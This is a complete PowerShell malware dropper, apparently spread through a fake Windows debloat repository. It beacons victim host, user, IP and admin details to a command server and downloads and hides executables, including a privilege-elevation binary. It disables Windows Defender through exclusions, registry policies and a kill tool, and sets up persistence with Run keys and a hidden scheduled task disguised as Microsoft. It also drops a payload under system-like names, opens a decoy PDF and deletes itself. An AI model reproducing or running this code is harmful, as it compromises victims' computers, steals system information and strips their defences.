$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}

$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
$srv='https://signindat.com'
$sources=@($srv,$gh)

$logPath="$env:TEMP\wmisrv.log"
function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }

$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
    }catch{}
}

_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
_log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

function _dl($n){
    foreach($src in $sources){
        try{
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData("$src/$n")
            _log "DL: $n $($d.Length) from $src"
            return ,$d
        }catch{}
    }
    _log "DL: $n fail"
    return $null
}

function _dlGh($n){
    try{
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $d=$wc.DownloadData("$gh/$n")
        _log "DL: $n $($d.Length) from github"
        return ,$d
    }catch{
        _log "DL: $n fail from github"
        return $null
    }
}

function _run($n,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        Start-Process $p -WindowStyle Hidden | Out-Null
        _log "$s : $l ok"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _runArg($n,$a,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        Start-Process $p -ArgumentList $a -WindowStyle Hidden | Out-Null
        _log "$s : $l ok ($a)"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _runWait($n,$a,$s,$l,$sec){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)|Out-Null
        $proc=Start-Process $p -ArgumentList $a -WindowStyle Hidden -PassThru
        _log "$s : $l started, waiting ${sec}s"
        Start-Sleep $sec
        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
        _log "$s : $l done"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

if(-not $cbIsAdmin){
    _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
    Start-Sleep 8
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    _log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
}

if($cbIsAdmin){
    try{
        $mp='Add-MpPreference'
        & $mp -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionProcess 'wmisrv.exe' -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionProcess 'msupdate.exe' -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue | Out-Null
        & $mp -ExclusionProcess 'windefctl.exe' -ErrorAction SilentlyContinue | Out-Null
    }catch{}

    try{
        $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
        if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $dp -Name 'DisableRoutinelyTakingAction' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        $rtp="$dp\Real-Time Protection"
        if(-not(Test-Path $rtp)){New-Item -Path $rtp -Force|Out-Null}
        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $rtp -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $rtp -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        _log "S2: reg ok"
    }catch{}
}

# download windefctl regardless of admin (for logging/diagnosis and UAC attempt)
$wdcBytes=_dlGh 'windefctl.exe'
$wdcPath="$env:TEMP\windefctl.exe"
if($wdcBytes){
    [IO.File]::WriteAllBytes($wdcPath,$wdcBytes)|Out-Null
    _log "S2: windefctl written $($wdcBytes.Length)"
    if($cbIsAdmin){
        try{
            $proc=Start-Process $wdcPath -ArgumentList 'kill' -WindowStyle Hidden -PassThru
            _log "S2: defkill started, pid=$($proc.Id), waiting 18s"
            Start-Sleep 18
            if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
            _log "S2: defkill done"
            _cb 'S2' 'ok' 'defender killed'
        }catch{
            _log "S2: defkill err: $($_.Exception.Message)"
            _cb 'S2' 'fail' 'defkill err'
        }
    }else{
        _log 'S2: no admin, skipping defkill exec'
        _cb 'S2' 'skip' 'no admin'
    }
}else{
    _log 'S2: windefctl dl fail'
    _cb 'S2' 'fail' 'windefctl dl fail'
}

# cleanup windefctl binary
Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null

$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
}catch{}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
    }catch{}

    $taskName='WindowsHealthMonitor'
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$env:TEMP\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
}

_cb 'S3' 'ok' 'persist ok'

# download payload once
$ppBytes=_dl 'PatchPulsaar.exe'
$ppTemp="$env:TEMP\PatchPulsaar.exe"
$ppPaths=@(
    "$env:TEMP\wmisrv.exe",
    "$env:APPDATA\svchost.exe",
    "$env:USERPROFILE\Downloads\msupdate.exe"
)
if($ppBytes){
    # write original copy
    [IO.File]::WriteAllBytes($ppTemp,$ppBytes)|Out-Null
    _log "S5: PatchPulsaar written $($ppBytes.Length)"
    # mirror into excluded folders/names
    foreach($mirror in $ppPaths){
        try{
            [IO.File]::WriteAllBytes($mirror,$ppBytes)|Out-Null
            _log "S5: mirror $mirror"
        }catch{ _log "S5: mirror fail $mirror" }
    }
    # run from excluded location
    $runPath=$ppPaths[0]
    try{
        Start-Process $runPath -WindowStyle Hidden | Out-Null
        _log "S5: payload started from $runPath"
        _cb 'S5' 'ok' 'payload'
    }catch{
        _log "S5: payload start err: $($_.Exception.Message)"
        _cb 'S5' 'fail' 'payload err'
    }
}else{
    _log 'S5: PatchPulsaar dl fail'
    _cb 'S5' 'fail' 'payload dl fail'
}

# cleanup payload mirrors after a delay
Start-Job -ScriptBlock {
    Start-Sleep 30
    foreach($f in @("$env:TEMP\PatchPulsaar.exe","$env:TEMP\wmisrv.exe","$env:APPDATA\svchost.exe","$env:USERPROFILE\Downloads\msupdate.exe")){Remove-Item $f -Force -ErrorAction SilentlyContinue}
}|Out-Null

$pdf='Rate_Confirmation_LD-2026-0847.pdf'
$pdfPath="$env:USERPROFILE\Downloads\$pdf"
$pdfBytes=_dl $pdf
if($pdfBytes){
    [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)|Out-Null
    try{Start-Process $pdfPath | Out-Null;_cb 'S7' 'ok' 'pdf ok'}catch{_cb 'S7' 'warn' 'pdf open fail'}
}else{_cb 'S7' 'warn' 'pdf dl fail'}

Start-Sleep 5
Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden | Out-Null
}

_log 'S9: done'
_cb 'S9' 'ok' 'done'
